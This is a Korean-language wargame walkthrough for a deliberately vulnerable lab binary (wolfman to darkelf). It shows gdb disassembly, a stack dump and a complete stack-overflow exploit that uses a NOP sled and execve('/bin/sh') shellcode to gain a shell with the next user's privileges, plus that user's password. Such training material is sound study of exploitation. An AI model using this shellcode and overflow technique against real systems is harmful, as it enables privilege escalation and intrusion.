@@ -1,0 +1,211 @@
+1. 환경변수를 memset함
+2. 버퍼도 제한
+3. 이번엔 문자열길이도 제한함 48자 이상 부터 강제종료
+
+
+지금 현상황 딱 48자 버퍼
+
+40 + 4 + 4 느낌
+
+argv[1] 을 제한했다면 
+
+argv[2]에 넣어주면 됨
+
+[wolfman@localhost wolfman]$ gdb -q aaa
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048500 <main>:       push   %ebp
+0x8048501 <main+1>:     mov    %ebp,%esp
+0x8048503 <main+3>:     sub    %esp,44
+0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
+0x804850a <main+10>:    jg     0x8048523 <main+35>
+0x804850c <main+12>:    push   0x8048670
+0x8048511 <main+17>:    call   0x8048410 <printf>
+0x8048516 <main+22>:    add    %esp,4
+0x8048519 <main+25>:    push   0
+0x804851b <main+27>:    call   0x8048420 <exit>
+0x8048520 <main+32>:    add    %esp,4
+0x8048523 <main+35>:    nop
+0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
+0x804852b <main+43>:    nop
+0x804852c <main+44>:    lea    %esi,[%esi*1]
+0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
+0x8048533 <main+51>:    lea    %edx,[%eax*4]
+0x804853a <main+58>:    mov    %eax,%ds:0x80497a4
+0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
+0x8048543 <main+67>:    jne    0x8048547 <main+71>
+0x8048545 <main+69>:    jmp    0x8048587 <main+135>
+0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
+---Type <return> to continue, or q <return> to quit---
+0x804854a <main+74>:    lea    %edx,[%eax*4]
+0x8048551 <main+81>:    mov    %eax,%ds:0x80497a4
+0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
+0x8048559 <main+89>:    push   %edx
+0x804855a <main+90>:    call   0x80483f0 <strlen>
+0x804855f <main+95>:    add    %esp,4
+0x8048562 <main+98>:    mov    %eax,%eax
+0x8048564 <main+100>:   push   %eax
+0x8048565 <main+101>:   push   0
+0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
+0x804856a <main+106>:   lea    %edx,[%eax*4]
+0x8048571 <main+113>:   mov    %eax,%ds:0x80497a4
+0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
+0x8048579 <main+121>:   push   %edx
+0x804857a <main+122>:   call   0x8048430 <memset>
+0x804857f <main+127>:   add    %esp,12
+0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
+0x8048585 <main+133>:   jmp    0x8048530 <main+48>
+0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
+0x804858a <main+138>:   add    %eax,4
+0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
+0x804858f <main+143>:   add    %edx,47
+0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
+---Type <return> to continue, or q <return> to quit---
+0x8048595 <main+149>:   je     0x80485b0 <main+176>
+0x8048597 <main+151>:   push   0x804867c
+0x804859c <main+156>:   call   0x8048410 <printf>
+0x80485a1 <main+161>:   add    %esp,4
+0x80485a4 <main+164>:   push   0
+0x80485a6 <main+166>:   call   0x8048420 <exit>
+0x80485ab <main+171>:   add    %esp,4
+0x80485ae <main+174>:   mov    %esi,%esi
+0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485b3 <main+179>:   add    %eax,4
+0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
+0x80485b8 <main+184>:   push   %edx
+0x80485b9 <main+185>:   call   0x80483f0 <strlen>
+0x80485be <main+190>:   add    %esp,4
+0x80485c1 <main+193>:   mov    %eax,%eax
+0x80485c3 <main+195>:   cmp    %eax,48
+0x80485c6 <main+198>:   jbe    0x80485e0 <main+224>
+0x80485c8 <main+200>:   push   0x8048699
+0x80485cd <main+205>:   call   0x8048410 <printf>
+0x80485d2 <main+210>:   add    %esp,4
+0x80485d5 <main+213>:   push   0
+0x80485d7 <main+215>:   call   0x8048420 <exit>
+0x80485dc <main+220>:   add    %esp,4
+---Type <return> to continue, or q <return> to quit---
+0x80485df <main+223>:   nop
+0x80485e0 <main+224>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485e3 <main+227>:   add    %eax,4
+0x80485e6 <main+230>:   mov    %edx,DWORD PTR [%eax]
+0x80485e8 <main+232>:   push   %edx
+0x80485e9 <main+233>:   lea    %eax,[%ebp-40]
+0x80485ec <main+236>:   push   %eax
+0x80485ed <main+237>:   call   0x8048440 <strcpy>
+0x80485f2 <main+242>:   add    %esp,8
+0x80485f5 <main+245>:   lea    %eax,[%ebp-40]
+0x80485f8 <main+248>:   push   %eax
+0x80485f9 <main+249>:   push   0x80486b0
+0x80485fe <main+254>:   call   0x8048410 <printf>
+0x8048603 <main+259>:   add    %esp,8
+0x8048606 <main+262>:   push   40
+0x8048608 <main+264>:   push   0
+0x804860a <main+266>:   lea    %eax,[%ebp-40]
+0x804860d <main+269>:   push   %eax
+0x804860e <main+270>:   call   0x8048430 <memset>
+0x8048613 <main+275>:   add    %esp,12
+0x8048616 <main+278>:   leave
+0x8048617 <main+279>:   ret
+0x8048618 <main+280>:   nop
+---Type <return> to continue, or q <return> to quit---
+0x8048619 <main+281>:   nop
+0x804861a <main+282>:   nop
+0x804861b <main+283>:   nop
+0x804861c <main+284>:   nop
+0x804861d <main+285>:   nop
+0x804861e <main+286>:   nop
+0x804861f <main+287>:   nop
+End of assembler dump.
+(gdb) main*+237
+Undefined maintenance command: "*+237".  Try "help maintenance".
+(gdb) b*main+237
+Breakpoint 1 at 0x80485ed
+(gdb) r `python -c 'print "A"*44+"\xbf"*4'`
+Starting program: /home/wolfman/aaa `python -c 'print "A"*44+"\xbf"*4'`
+
+Breakpoint 1, 0x80485ed in main ()
+
+
+
+
+(gdb) x/1000x $esp
+0xbffffab4:     0xbffffac0      0xbffffc42      0x00000015      0xbffffae8
+0xbffffac4:     0x4000a970      0x400f855b      0x080496d4      0x4000ae60
+0xbffffad4:     0xbffffb34      0xbffffae8      0x080484eb      0x080496c0
+0xbffffae4:     0x080496d4      0xbffffb08      0x400309cb      0x00000002
+0xbffffaf4:     0xbffffb34      0xbffffb40      0x40013868      0x00000002
+0xbffffb04:     0x08048450      0x00000000      0x08048471      0x08048500
+0xbffffb14:     0x00000002      0xbffffb34      0x08048390      0x0804864c
+0xbffffb24:     0x4000ae60      0xbffffb2c      0x40013e90      0x00000002
+0xbffffb34:     0xbffffc30      0xbffffc42      0x00000000      0xbffffc73
+0xbffffb44:     0xbffffc95      0xbffffc9f      0xbffffcad      0xbffffccc
+0xbffffb54:     0xbffffcdc      0xbffffcf5      0xbffffd12      0xbffffd31
+0xbffffb64:     0xbffffd3c      0xbffffd4a      0xbffffd8d      0xbffffda0
+0xbffffb74:     0xbffffdb5      0xbffffdc5      0xbffffdd2      0xbffffdf1
+0xbffffb84:     0xbffffdfc      0xbffffe0d      0xbffffe1f      0xbffffe27
+0xbffffb94:     0x00000000      0x00000003      0x08048034      0x00000004
+0xbffffba4:     0x00000020      0x00000005      0x00000006      0x00000006
+0xbffffbb4:     0x00001000      0x00000007      0x40000000      0x00000008
+0xbffffbc4:     0x00000000      0x00000009      0x08048450      0x0000000b
+0xbffffbd4:     0x000001f9      0x0000000c      0x000001f9      0x0000000d
+0xbffffbe4:     0x000001f9      0x0000000e      0x000001f9      0x00000010
+0xbffffbf4:     0x0f8bfbff      0x0000000f      0xbffffc2b      0x00000000
+0xbffffc04:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffc14:     0x00000000      0x00000000      0x00000000      0x00000000
+---Type <return> to continue, or q <return> to quit---
+0xbffffc24:     0x00000000      0x69000000      0x00363836      0x6d6f682f
+0xbffffc34:     0x6f772f65      0x616d666c      0x61612f6e      0x41410061
+0xbffffc44:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc54:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc64:     0x41414141      0x41414141      0xbfbf4141      0x0000bfbf
+0xbffffc74:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffc84:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffc94:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffca4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffcb4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffcc4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffcd4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffce4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffcf4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd04:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd14:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd24:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd34:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd44:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd54:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd64:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd74:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd84:     0x00000000      0x00000000      0x00000000      0x00000000
+
+
+
+
+
+주소는 ==  0xbffffc54
+
+따라서 페이로드를 작성해서 쉘을 획득하면?
+
+./darkelf `python -c 'print "\x90"*44+"\x54\xfc\xff\xbf"'` `python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱T??
+bash$ id
+uid=505(wolfman) gid=505(wolfman) euid=506(darkelf) egid=506(darkelf) groups=505(wolfman)
+bash$ my-apss
+sh: my-apss: command not found
+bash$ my-pass
+euid = 506
+kernel crashed
+
+
+
+결론
+
+제한을 두어도 NOP 로 흘리기 공격이 가능함
+
+공격에 두가지 가있음 argv[2] 주소를 찾아서 공격을 하던가
+argv[1]을 사용해두 되지만 NOP로 흘려야한다.
+
+즉 페이로드는 버퍼 + ret주소 , (새로열어서) + NOP + 쉘코드 
+
+
